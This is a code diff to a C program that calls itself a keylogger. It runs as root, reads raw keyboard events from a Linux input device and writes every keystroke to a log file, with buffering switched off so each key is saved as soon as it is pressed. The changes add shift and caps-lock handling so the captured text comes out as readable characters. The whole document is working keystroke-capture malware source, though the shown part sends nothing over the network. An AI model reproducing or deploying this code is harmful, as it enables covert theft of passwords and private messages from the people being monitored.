@@ -5,38 +5,53 @@
 
 #define KEY_PRESS 1
 #define KEY_RELEASE 0
+#define LEFTSHIFT 42
+#define RIGHTSHIFT 54
+#define CAPSLOCK 58
+#define ROOTID 0
 
 // arrays for keys(for both small and capital chars)
-static const char *keys_upper[] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "MINUS", "EQUAL", "BACKSPACE", "TAB", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "LEFTBRACE", "RIGHTBRACE", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", "SEMICOLON", "APOSTROPHE", "GRAVE", "LEFTSHIFT", "BACKSLASH", "Z", "X", "C", "V", "B", "N", "M", "COMMA", "DOT", "SLASH", "RIGHTSHIFT", "KPASTERISK", "LEFTALT", "SPACE", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "KP7", "KP8", "KP9", "KPMINUS", "KP4", "KP5", "KP6", "KPPLUS", "KP1", "KP2", "KP3", "KP0", "KPDOT", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "KPJPCOMMA", "KPENTER", "RIGHTCTRL", "KPSLASH", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER"};
-static const char *keys_lower[] = {"reserved", "esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "minus", "equal", "backspace", "tab", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "leftbrace", "rightbrace", "enter", "leftctrl", "a", "s", "d", "f", "g", "h", "j", "k", "l", "semicolon", "apostrophe", "grave", "leftshift", "backslash", "z", "x", "c", "v", "b", "n", "m", "comma", "dot", "slash", "rightshift", "kpasterisk", "leftalt", "space", "capslock", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "numlock", "scrolllock", "kp7", "kp8", "kp9", "kpminus", "kp4", "kp5", "kp6", "kpplus", "kp1", "kp2", "kp3", "kp0", "kpdot", "zenkakuhankaku", "102nd", "f11", "f12", "ro", "katakana", "hiragana", "henkan", "katakanahiragana", "muhenkan", "kpjpcomma", "kpenter", "rightctrl", "kpslash", "sysrq", "rightalt", "linefeed", "home", "up", "pageup", "left", "right", "end", "down", "pagedown", "insert", "delete", "macro", "mute", "volumedown", "volumeup", "power"};
+static char *keys_upper[] = {"RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE", "	", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "ENTER", "LEFTCTRL", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "`", "LEFTSHIFT", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "RIGHTSHIFT", "*", "LEFTALT", " ", "CAPSLOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUMLOCK", "SCROLLLOCK", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "ZENKAKUHANKAKU", "102ND", "F11", "F12", "RO", "KATAKANA", "HIRAGANA", "HENKAN", "KATAKANAHIRAGANA", "MUHENKAN", "JPCOMMA", "ENTER", "RIGHTCTRL", "/", "SYSRQ", "RIGHTALT", "LINEFEED", "HOME", "UP", "PAGEUP", "LEFT", "RIGHT", "END", "DOWN", "PAGEDOWN", "INSERT", "DELETE", "MACRO", "MUTE", "VOLUMEDOWN", "VOLUMEUP", "POWER"};
+static char *keys_lower[] = {"reserved", "esc", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "backspace", "	", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "enter", "leftctrl", "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "leftshift", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "rightshift", "*", "leftalt", " ", "capslock", "f1", "f2", "f3", "f4", "f5", "f6", "f7", "f8", "f9", "f10", "numlock", "scrolllock", "7", "8", "9", "-", "4", "5", "6", "+", "1", "2", "3", "0", ".", "zenkakuhankaku", "102nd", "f11", "f12", "ro", "katakana", "hiragana", "henkan", "katakanahiragana", "muhenkan", "jpcomma", "enter", "rightctrl", "/", "sysrq", "rightalt", "linefeed", "home", "up", "pageup", "left", "right", "end", "down", "pagedown", "insert", "delete", "macro", "mute", "volumedown", "volumeup", "power"};
 
-// 
+// checking for shift key
 static int isShiftPressed(int eventcode){
-	if((eventcode == 42) || (eventcode == 54)){
+	if((eventcode == LEFTSHIFT) || (eventcode == RIGHTSHIFT)){
+		return 1;
+	}
+	return 0;
+}
+
+// checking for capslock
+static int isCapsOn(int eventcode){
+	if(eventcode == CAPSLOCK){
 		return 1;
 	}
 	return 0;
 }
 
 // convert event code to corresponding char
-static char *pressedKey(int eventcode, int shift){
-	if(shift == 1){
+static char *pressedKey(int eventcode, int shift, int caps){
+	if(shift^caps){
 		return keys_upper[eventcode];
 	}
 	return keys_lower[eventcode];
 }
 
+// main function
 int main(){
+
 	// initializations
 	typedef struct input_event input_event;
 	input_event event;
 	int shift = 0;
+	int caps = 0;
 
 	// banner
 	printf("############ Keylogger Started #############\n");
 
 	// root check
-	if(geteuid() != 0){
+	if(geteuid() != ROOTID){
 		printf("You must be root\n");
 		exit(0);
 	}
@@ -49,6 +64,9 @@ int main(){
 		printf("Error in opening Log file\n");
 		exit(0);
 	}
+
+	/* To disable buffering and allow writing to log file 
+		as soon as a key is pressed */
 	setbuf(lf, NULL);
 
 	// device file
@@ -68,7 +86,10 @@ int main(){
 					if(isShiftPressed(event.code)){
 						shift = 1;
 					}
-					char *key = pressedKey(event.code, shift);
+					if(isCapsOn(event.code)){
+						caps = caps^1;
+					}
+					char *key = pressedKey(event.code, shift, caps);
 					fputs(key, lf);
 				}
 				if(event.value == KEY_RELEASE){
